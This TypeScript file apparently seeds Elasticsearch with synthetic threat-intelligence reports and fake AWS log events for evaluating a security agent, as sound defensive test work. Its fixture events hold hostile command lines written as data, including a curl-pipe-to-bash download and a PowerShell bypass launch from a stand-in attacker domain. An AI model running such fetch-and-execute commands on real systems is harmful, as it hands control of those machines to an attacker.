/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import crypto from 'crypto';
import type { Client } from '@elastic/elasticsearch';
import type { ToolingLog } from '@kbn/tooling-log';

const THREAT_REPORTS_DATA_STREAM = '.kibana-threat-reports';
const THREAT_INTEL_SUBSCRIPTIONS_INDEX = '.kibana-threat-intel-subscriptions';
const THREAT_INTEL_ENVIRONMENT_INDEX = 'logs-aws.local';
const THREAT_INTEL_ADAPTER_ID = 'data-generator-evals';
const THREAT_INTEL_REPORT_IDS = [
  'eval-threat-intel-aws-ssm',
  'eval-threat-intel-ransomware-ssm',
] as const;
const THREAT_INTEL_EVENT_IDS = [
  'eval-threat-intel-env-aws-ssm-1',
  'eval-threat-intel-env-aws-ssm-2',
  'eval-threat-intel-env-aws-ssm-3',
] as const;
const THREAT_INTEL_SUBSCRIPTION_ID = 'eval-threat-intel-digest';

const sha256 = (input: string): string => crypto.createHash('sha256').update(input).digest('hex');

const defang = (value: string): string =>
  value.replace(/\./g, '[.]').replace(/^https?:/, 'https[:]');

const getStatusCode = (err: unknown): number | undefined => {
  if (err && typeof err === 'object' && 'meta' in err) {
    const meta = (err as { meta?: { statusCode?: number } }).meta;
    return meta?.statusCode;
  }
  return undefined;
};

const scenarioText = {
  primaryBody:
    'Ransomware operators are abusing AWS Systems Manager for remote management access. ' +
    'The actor uses amazon-ssm-agent to launch PowerShell and download tooling from ' +
    'https://evil-ssm-control.net/update.ps1. Observed infrastructure includes 45.83.64.10 ' +
    'and evil-ssm-control.net. Detection teams should hunt for PowerShell or shell execution ' +
    'from SSM agents, followed by ingress tool transfer from attacker infrastructure.',
  relatedBody:
    'A related cloud-security advisory describes remote management abuse through AWS SSM ' +
    'RunShellScript commands. The same control infrastructure, 45.83.64.10 and ' +
    'evil-ssm-control.net, was used to stage scripts and transfer tooling. Durable coverage ' +
    'should focus on T1059.001, T1105, and T1219 rather than only blocking the current IOCs.',
};

const timestampAt = (ratio: number): string =>
  new Date(Date.now() - Math.round((1 - ratio) * 24 * 60 * 60 * 1000)).toISOString();

const buildThreatIntelReport = ({
  id,
  timestamp,
  title,
  body,
  severity,
  severityScore,
  relatedReportIds,
  environmentHits,
}: {
  id: string;
  timestamp: string;
  title: string;
  body: string;
  severity: 'high' | 'critical';
  severityScore: number;
  relatedReportIds: string[];
  environmentHits: number;
}) => {
  const iocs = [
    { type: 'ip', value: '45.83.64.10', defanged: defang('45.83.64.10'), severity: 'high' },
    {
      type: 'domain',
      value: 'evil-ssm-control.net',
      defanged: defang('evil-ssm-control.net'),
      severity: 'high',
    },
    {
      type: 'url',
      value: 'https://evil-ssm-control.net/update.ps1',
      defanged: defang('https://evil-ssm-control.net/update.ps1'),
      severity: 'high',
    },
  ];

  return {
    '@timestamp': timestamp,
    content_fingerprint: sha256(`${id}:${body}`),
    space_id: 'default',
    source: {
      type: 'manual',
      name: 'Agent Builder eval fixture',
      url: `data-generator://threat-intel-evals/${id}`,
      adapter_id: THREAT_INTEL_ADAPTER_ID,
    },
    content: {
      title,
      body_text: body,
      language: 'en',
    },
    severity: { level: severity, score: severityScore },
    rank_score: severityScore * 0.92,
    corroborated_rank_score: severityScore * 1.18,
    extracted: {
      iocs,
      ioc_set_hash: sha256(iocs.map((ioc) => `${ioc.type}:${ioc.value}`).join('|')),
      relevance: 0.92,
      detection_actionability: 'rule_candidate',
      ttps: {
        tactics: ['TA0002', 'TA0011'],
        techniques: ['T1059.001', 'T1105', 'T1219'],
      },
      behaviors: [
        {
          id: `${id}:T1059.001`,
          technique_id: 'T1059.001',
          description:
            'PowerShell launched from a remote management agent to execute follow-on tooling.',
          telemetry_targets: ['process.command_line', 'process.parent.name', 'host.name'],
          llm_confidence: 0.97,
          confidence: 0.97,
        },
        {
          id: `${id}:T1105`,
          technique_id: 'T1105',
          description:
            'Tooling downloaded from attacker-controlled infrastructure after remote access.',
          telemetry_targets: ['url.full', 'destination.domain', 'process.command_line'],
          llm_confidence: 0.94,
          confidence: 0.94,
        },
        {
          id: `${id}:T1219`,
          technique_id: 'T1219',
          description: 'Remote management tooling used as the initial operator control channel.',
          telemetry_targets: ['process.name', 'event.dataset', 'cloud.provider'],
          llm_confidence: 0.88,
          confidence: 0.88,
        },
      ],
      threat_actors: ['sailor-81'],
      target_sectors: ['technology', 'cloud-hosted-services'],
      categories: ['cloud-security', 'ransomware', 'malware'],
    },
    geography: { regions: ['north-america', 'global'] },
    provenance: {
      ingested_at: timestamp,
      extracted_at: timestamp,
      extraction_method: 'data_generator',
      related_reports: relatedReportIds,
      related_reports_count: relatedReportIds.length,
      environment_hits: {
        window: 'last_7d',
        computed_at: timestamp,
        layer_1_ioc_match: environmentHits,
        layer_2_behavioral: 2,
      },
      environment_hits_total: environmentHits + 2,
    },
    feedback: {
      ioc_hit_count: environmentHits,
      ttp_hit_count: 2,
      affected_host_count: 2,
      affected_user_count: 2,
      last_hunted_at: timestamp,
      last_hunt_status: 'environment_hits_found',
      last_hunt_window: {
        from: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
        to: timestamp,
      },
    },
  };
};

const buildThreatIntelEnvironmentDocs = (timestamps: string[]) => [
  {
    '@timestamp': timestamps[0],
    event: { dataset: 'aws.cloudtrail', module: 'aws', action: 'SendCommand' },
    data_stream: { dataset: 'aws.cloudtrail', type: 'logs', namespace: 'local' },
    cloud: { provider: 'aws', service: { name: 'ssm' }, region: 'us-east-1' },
    host: { name: 'eval-ssm-host-1', os: { family: 'windows' } },
    user: { name: 'eval-aws-admin' },
    source: { ip: '45.83.64.10' },
    destination: { ip: '10.42.7.15', domain: 'evil-ssm-control.net' },
    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
    process: {
      name: 'powershell.exe',
      command_line:
        'powershell.exe -ExecutionPolicy Bypass -File https://evil-ssm-control.net/update.ps1',
      parent: { name: 'amazon-ssm-agent.exe' },
    },
    tags: ['agent-builder-eval', 'threat-intel', 'cloud-security'],
  },
  {
    '@timestamp': timestamps[1],
    event: { dataset: 'aws.cloudtrail', module: 'aws', action: 'RunShellScript' },
    data_stream: { dataset: 'aws.cloudtrail', type: 'logs', namespace: 'local' },
    cloud: { provider: 'aws', service: { name: 'ssm' }, region: 'us-east-1' },
    host: { name: 'eval-ssm-host-2', os: { family: 'linux' } },
    user: { name: 'eval-aws-ops' },
    source: { ip: '45.83.64.10' },
    destination: { ip: '10.42.8.20', domain: 'evil-ssm-control.net' },
    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
    process: {
      name: 'sh',
      command_line: 'sh -c curl https://evil-ssm-control.net/update.ps1 | bash',
      parent: { name: 'amazon-ssm-agent' },
    },
    tags: ['agent-builder-eval', 'threat-intel', 'cloud-security'],
  },
  {
    '@timestamp': timestamps[2],
    event: { dataset: 'aws.vpcflow', module: 'aws', action: 'connection_attempt' },
    data_stream: { dataset: 'aws.vpcflow', type: 'logs', namespace: 'local' },
    cloud: { provider: 'aws', region: 'us-east-1' },
    host: { name: 'eval-ssm-host-1', os: { family: 'windows' } },
    user: { name: 'eval-aws-admin' },
    source: { ip: '10.42.7.15' },
    destination: { ip: '45.83.64.10', domain: 'evil-ssm-control.net' },
    url: { full: 'https://evil-ssm-control.net/update.ps1', domain: 'evil-ssm-control.net' },
    tags: ['agent-builder-eval', 'threat-intel', 'cloud-security'],
  },
];

const ensureThreatReportsDataStream = async (esClient: Client, log: ToolingLog) => {
  try {
    await esClient.indices.getDataStream({ name: THREAT_REPORTS_DATA_STREAM });
  } catch (err) {
    if (getStatusCode(err) !== 404) throw err;
    await esClient.indices.createDataStream({ name: THREAT_REPORTS_DATA_STREAM });
    log.info(`[threat-intel eval] Created ${THREAT_REPORTS_DATA_STREAM} data stream`);
  }
};

const ensureEnvironmentIndex = async (esClient: Client) => {
  const exists = await esClient.indices.exists({ index: THREAT_INTEL_ENVIRONMENT_INDEX });
  if (exists) return;

  await esClient.indices.create({
    index: THREAT_INTEL_ENVIRONMENT_INDEX,
    mappings: {
      dynamic: true,
      properties: {
        '@timestamp': { type: 'date' },
        tags: { type: 'keyword' },
      },
    },
  });
};

const deleteByQuery = async ({
  esClient,
  index,
  query,
}: {
  esClient: Client;
  index: string;
  query: Record<string, unknown>;
}) => {
  try {
    await esClient.deleteByQuery({
      index,
      conflicts: 'proceed',
      refresh: true,
      query,
    });
  } catch (err) {
    if (getStatusCode(err) !== 404) throw err;
  }
};

const cleanupThreatIntelFixtures = async (esClient: Client) => {
  await deleteByQuery({
    esClient,
    index: THREAT_REPORTS_DATA_STREAM,
    query: { term: { 'source.adapter_id': THREAT_INTEL_ADAPTER_ID } },
  });
  await deleteByQuery({
    esClient,
    index: THREAT_INTEL_ENVIRONMENT_INDEX,
    query: { ids: { values: [...THREAT_INTEL_EVENT_IDS] } },
  });
  await deleteByQuery({
    esClient,
    index: THREAT_INTEL_SUBSCRIPTIONS_INDEX,
    query: { ids: { values: [THREAT_INTEL_SUBSCRIPTION_ID] } },
  });
};

export const seedThreatIntelFixtures = async ({
  esClient,
  log,
}: {
  esClient: Client;
  log: ToolingLog;
}): Promise<{ cleanup: () => Promise<void> }> => {
  await ensureThreatReportsDataStream(esClient, log);
  await ensureEnvironmentIndex(esClient);
  await cleanupThreatIntelFixtures(esClient);

  const reportTimestamp = timestampAt(0.7);
  const relatedReportTimestamp = timestampAt(0.75);
  const eventTimestamps = [timestampAt(0.82), timestampAt(0.84), timestampAt(0.86)];
  const reports = [
    buildThreatIntelReport({
      id: THREAT_INTEL_REPORT_IDS[0],
      timestamp: reportTimestamp,
      title: 'Ransomware operators abusing AWS SSM and PowerShell',
      body: scenarioText.primaryBody,
      severity: 'critical',
      severityScore: 90,
      relatedReportIds: [THREAT_INTEL_REPORT_IDS[1]],
      environmentHits: 3,
    }),
    buildThreatIntelReport({
      id: THREAT_INTEL_REPORT_IDS[1],
      timestamp: relatedReportTimestamp,
      title: 'Synthetic advisory: AWS SSM agent abuse for remote access',
      body: scenarioText.relatedBody,
      severity: 'high',
      severityScore: 80,
      relatedReportIds: [THREAT_INTEL_REPORT_IDS[0]],
      environmentHits: 2,
    }),
  ];

  await esClient.bulk({
    refresh: true,
    body: reports.flatMap((document) => [
      { create: { _index: THREAT_REPORTS_DATA_STREAM } },
      document,
    ]),
  });

  const environmentDocs = buildThreatIntelEnvironmentDocs(eventTimestamps);
  await esClient.bulk({
    refresh: true,
    body: environmentDocs.flatMap((document, index) => [
      { index: { _index: THREAT_INTEL_ENVIRONMENT_INDEX, _id: THREAT_INTEL_EVENT_IDS[index] } },
      document,
    ]),
  });

  await esClient.index({
    index: THREAT_INTEL_SUBSCRIPTIONS_INDEX,
    id: THREAT_INTEL_SUBSCRIPTION_ID,
    refresh: true,
    document: {
      owner: 'agent-builder-eval',
      tags: ['agent-builder-eval', 'cloud-security', 'ransomware'],
      severity_threshold: 'medium',
      schedule_rrule: 'FREQ=DAILY;BYHOUR=9;BYMINUTE=0',
      delivery: { type: 'email', target: 'security-ops@example.com' },
      human_summary:
        'Daily digest of medium+ severity reports tagged `agent-builder-eval`, `cloud-security`, `ransomware` delivered to `security-ops@example.com`.',
      template_id: 'agent-builder-eval-threat-intel',
      space_id: 'default',
      created_at: reportTimestamp,
      updated_at: reportTimestamp,
    },
  });

  log.info(
    `[threat-intel eval] Seeded ${reports.length} reports, ${environmentDocs.length} environment events, and 1 subscription`
  );

  return {
    cleanup: async () => {
      await cleanupThreatIntelFixtures(esClient);
      log.info('[threat-intel eval] Cleanup complete');
    },
  };
};
